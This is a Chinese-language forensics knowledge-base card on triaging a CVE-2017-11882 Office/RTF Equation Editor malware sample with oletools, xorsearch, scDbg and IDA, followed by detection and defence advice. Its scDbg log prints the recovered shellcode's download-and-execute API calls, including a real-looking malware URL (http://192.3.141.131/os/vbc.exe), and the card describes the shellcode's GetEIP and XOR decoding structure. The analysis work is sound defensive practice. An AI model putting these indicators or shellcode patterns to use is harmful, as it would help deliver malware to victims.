---
id: defense-forensics-office-rtf-equation-editor-sample-shellcode-triage
title: Office 外链 RTF 样本分析：oleid/oleobj 取外部关系、rtfobj 提 Equation.3 对象、xorsearch 定位 GetEIP、scDbg FindSc/CreateDump 还原下载执行 shellcode
type: scenario
domain: defense
path: defense/forensics
technique: office-rtf-equation-editor-sample-shellcode-triage
tags:
- forensics
- malware-analysis
- office
- rtf
- ole
- shellcode
- scdbg
- xorsearch
- cve-2017-11882
- incident-response
cve:
- CVE-2017-11882
severity: medium
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V572
  verified_at: '2026-11-12T10:40:51+08:00'
  notes: 已对照原文（12920，174 行）与 34 张截图逐张核对：oleid 外部关系 1 项 HIGH/oleobj frame 外链 bit.do/fQTgM（图01-03）、NetworkMiner 提取 fQTgM[1].html/dot[1].rtf/vbc.exe（图05）、rtfdump 需 Python2（图07）、rtfobj 两个非标准 OLE 对象 0x954(空文件)/0x903(shellcode)（图09）、xorsearch 0xBB 命中 GetEIP method 3 E9F9010000（图11-12）、IDA jmp loc_1FE 与 call/push/pop/jmp 骨架（图13-17）、scDbg FindSc 10 个候选选中 index 4 offset 0x1fe 还原 URLDownloadToFileW http://192.3.141.131/os/vbc.exe 与 ShellExecuteExW、step=40154（图18-19）、CreateDump Change found at 354（图20）、add ebp,15Dh→0x162、xor al,0C8h 解码循环、lea ecx,[ebp+297h]→0x3F9（图21-25）、Procmon EQNEDT32.EXE、gflags+x32dbg、DLL Load 断点（图26-29）、vbc.exe pestudio 熵 .text 6.251/.rsrc 5.645、ExeInfoPE VB5-6 无壳、CryptXXX API 字符串、CryptDecrypt 断点栈内 UNICODE MZ（图30-34）。核对中修正两处小误差：FindSc 候选实际为 10 个（补 0x1f5）、E9F9010000 为 jmp 非 call 形式。dedup：与 pentest-initial-access-cve-2017-11882-rtf-equation-editor-shellcode 为 same-CVE 不同视角（攻击构造 vs 样本取证），非同一利用链；dup-scan 无涉及。未验证点：未复现分析流程；vbc.exe 下一阶段未 dump 成功仅为原文边界，卡内已注明。
url: /docs/defense/forensics/defense-forensics-office-rtf-equation-editor-sample-shellcode-triage/
draft: false
kb_aliases:
- Office 样本分析
- RTF 样本分析
- Equation.3 OLE 对象分析
- rtfobj 提取 shellcode
- xorsearch GetEIP 定位
- scDbg FindSc
- CVE-2017-11882 样本取证
---

## 一句话结论

对疑似公式编辑器漏洞的 Office 样本，可按“OOXML 外部关系（oleid/oleobj）→ 下载的外链 RTF → rtfobj 提取 Equation.3 OLE 原始对象 → rtfobj 不经标准 OLE 解析也可 dump 原始字节 → xorsearch 按 GetEIP（call/pop）特征定位 shellcode 偏移 → scDbg FindSc 试跑各候选偏移并 CreateDump 记录解密后内存”的顺序，在纯静态+模拟执行条件下还原 shellcode 的 API 行为（如 `URLDownloadToFileW` 下载下一阶段 exe、`ShellExecuteExW` 执行），不需要真正打开恶意文档。

## 原理

- **OOXML 外链**：`.docx` 是 OpenXML 包，`word/_rels/document.xml.rels` 等关系文件中的 `Target` 可指向远程 URL。`oleid` 会把外部关系（external relationship）标为 HIGH 风险，`oleobj` 可直接列出关系类型（如 `frame`）与外部链接（本样本为短链 `http://bit.do/...`）。用 Office 打开文档时，Word 会以特定 UA（MSIE 7.0 兼容串）发起请求，可被流量侧捕获。
- **RTF 内嵌公式对象**：下载到的 RTF 用 `\object`/`\objdata` 嵌入 `Equation.3` OLE 对象。旧版公式编辑器 `EQNEDT32.EXE` 存在 CVE-2017-11882 栈溢出且无 ASLR/DEP，RTF 对象数据中可直接藏 shellcode；`rtfobj` 即使提示 “Not a well-formed OLE object” 也会把对象原始字节 dump 成 `.raw` 文件，因此非标准构造不阻塞提取。
- **定位 shellcode 起点**：shellcode 常以 `call`/`pop`（GetEIP）取当前地址，`xorsearch -W` 会按 XOR/ROT 等变体搜索 `GetEIP method 3` 特征并给出文件偏移（本样本在 0xBB 命中 `E9 F9 01 00 00`，是跳到主体入口的相对 jmp）；截断偏移前的数据后，IDA 反汇编可见入口处 `jmp` 跳到真正的入口（本样本 0x1FE），中间是 `call sub_xxx; push ecx; pop ecx; jmp sub_xxx` 的取址/解码骨架。
- **模拟执行验证**：`scDbg` 的 `FindSc` 会对多个候选偏移（本样本给出了 0x0/0x1a4/0x1f5/0x1fb/0x1fe/0x198/0x2f7/0x28e/0x254/0x2a4 共 10 个）逐个试跑，本样本选中 0x1fe 后日志直接给出 `GetProcAddress(ExpandEnvironmentStringsW)`、`ExpandEnvironmentStringsW(%PUBLIC%\vbc.exe)`、`LoadLibraryW(UrlMon)`、`URLDownloadToFileW(http://192.3.141.131/os/vbc.exe, C:\Users\Public\vbc.exe)`、`LoadLibraryW(shell32)`、`ShellExecuteExW`，即完整还原下载-执行行为；`CreateDump` 会把执行中的内存改动（Change found at 354）dump 成 `.unpack`。
- **解码循环**：IDA 中解码段以 `cmp ebp, ecx` 计数、`xor al, 0C8h` 逐字节异或、`lea ecx,[ebp+297h]` 定位解码数据起点（0x162+0x297=0x3F9），用于还原加密字符串/下一阶段数据。

## 触发条件

- 拿到可疑 `.docx/.doc/.rtf` 样本或以其为附件的流量 pcap。
- 分析机具备 oletools（oleid/oleobj/rtfdump/rtfobj）、NetworkMiner（流量取文件）、xorsearch、scDbg、010 Editor/IDA（或等价工具）；注意旧版 `rtfdump.py` 依赖 Python 2。
- 样本为 Equation Editor 类（CVE-2017-11882/CVE-2018-0802）或需要定位 RTF 内嵌 shellcode 的场景。
- 仅限授权取证与恶意样本分析环境。

## 利用步骤

1. `oleid sample.docx` 检查外部关系/宏等风险项；`oleobj sample.docx` 列出关系类型与外部链接（本样本 `Found relationship 'frame' with external link http://bit.do/...`）。
2. 按短链下载（可用与 Office 一致的 MSIE 7.0 UA 复现请求），或直接从 pcap 用 NetworkMiner 提取落地文件；本样本从流量中提取到外链 HTML、`dot.rtf` 与下一阶段 `vbc.exe`。
3. 对 RTF 使用 `rtfdump.py dot.rtf -s 1` 查看十六进制与对象层级（`\object`/`\objdata`、`Equation.3`）；再用 `rtfobj -s all -d <目录> dot.rtf` 把每个 OLE 对象原始字节 dump 成 `dot.rtf_object_*.raw`（对象非标准 OLE 时仍会 dump，记录 “Not a well-formed OLE object”）。
4. 对公式对象 raw 文件跑 `xorsearch -W`，按 `GetEIP method 3` 命中偏移（本样本 0xBB）；用 010 Editor 截断该偏移前的数据得到纯 shellcode。
5. IDA 反汇编：入口处可见跳转/取址骨架，例如 `jmp loc_1FE`、`call sub_28D; push ecx; pop ecx; jmp sub_28D`；用 scDbg 的 `FindSc` 对候选偏移逐个试跑，选择能产生 API 日志的入口（本样本 index 4、offset 0x1FE）。
6. 勾选 `Unlimited steps`、`Reporting Mode`/`Create Dump` 跑 scDbg，记录 API 序列（下载 URL、落地路径、执行 API）；`CreateDump` 的 `.unpack` 文件用于后续静态分析（解码字符串/下一阶段数据）。
7. 在 IDA 中定位解码循环（`xor al, imm8` + 计数器 + 数据指针计算），复算可还原被编码的字符串与载荷；把 shellcode 的下载 URL/落地路径与 pcap、文件哈希关联成 IOC。

## PoC

```bash
# 1) Office 包外部关系
oleid sample.docx
oleobj sample.docx

# 2) RTF 结构与 OLE 对象 dump（rtfdump 需 Python 2）
rtfdump.py dot.rtf -s 1
rtfobj -s all -d . dot.rtf

# 3) 按 GetEIP 特征定位 shellcode 偏移（本样本 0xBB）
xorsearch.exe -W dot.rtf_object_00000903.raw
```

```text
scDbg FindSc 输出（本样本，节选）：
0) offset=0x0 ... GetProcAddress
...
4) offset=0x1fe ...
Select index to execute:: 4
4011fe E88A000000  call 0x40128d
401203 51          push ecx
401204 59          pop ecx
401205 E983000000  jmp 0x40128d
...
401411 GetProcAddress(ExpandEnvironmentStringsW)
40141f ExpandEnvironmentStringsW(%PUBLIC%\vbc.exe, dst=12fb9c, sz=104)
401424 LoadLibraryW(UrlMon)
40143f GetProcAddress(URLDownloadToFileW)
401441 URLDownloadToFileW(http://192.3.141.131/os/vbc.exe, C:\Users\Public\vbc.exe)
40144d LoadLibraryW(shell32)
4014f1 GetProcAddress(ShellExecuteExW)
4014f9 unhooked call to shell32.ShellExecuteExW   step=40154
Change found at 354 dumping to SHELLC~1.unpack
```

## 变体与关联

- 攻击侧构造与版本影响见 [[pentest-initial-access-cve-2017-11882-rtf-equation-editor-shellcode]]；CVE-2018-0802 为同组件补丁绕过，样本分析路径相同。
- 同族投递方式见 [[pentest-initial-access-office-macro-document]]（宏文档）与 [[defense-detection-callstack-office-ole-embedded-object-drop]]（OLE 对象落地检测）。
- 变体：RTF 可能把可执行内容拆到多个 `\objdata` 或加入非标准结构；`rtfobj` 提示非标准 OLE 时仍可用 `xorsearch`/手工十六进制定位。短链跳转可能返回 HTML 再重定向到 RTF，需按最终落地文件而非首个响应分析。
- 边界：本文最后阶段的 `vbc.exe`（VB6 加载器，`.text/.rsrc` 高熵、`CryptDecrypt` 断点可见内存中 `MZ`）未能成功 dump 成标准 PE，下一阶段载荷未还原；该部分属未打通链路，不作为本卡方法的一部分。

## 检测与防御

- 检测：Office/Word 进程访问外部关系 URL 或以 MSIE 7.0 兼容 UA 外连；`EQNEDT32.EXE` 被 Office 拉起并派生网络/执行行为；RTF `objdata` 出现 `Equation.3` 与 GetEIP 型 shellcode 特征（`E8/E9` + `pop`）；pcap 中出现短链跳转到 RTF/EXE 的下载链。
- 防御：安装 CVE-2017-11882/CVE-2018-0802 补丁、kill-bit 禁用公式编辑器；启用 Protected View/ASR 阻断 Office 子进程与外部内容；邮件网关与沙箱拦截含 Equation.3 对象的 RTF。
- 响应：按本卡流程提取 shellcode 与下载 IOC，结合 pcap 与落地文件哈希做同源聚类；把 `%PUBLIC%` 等非常规落地目录纳入主机排查。
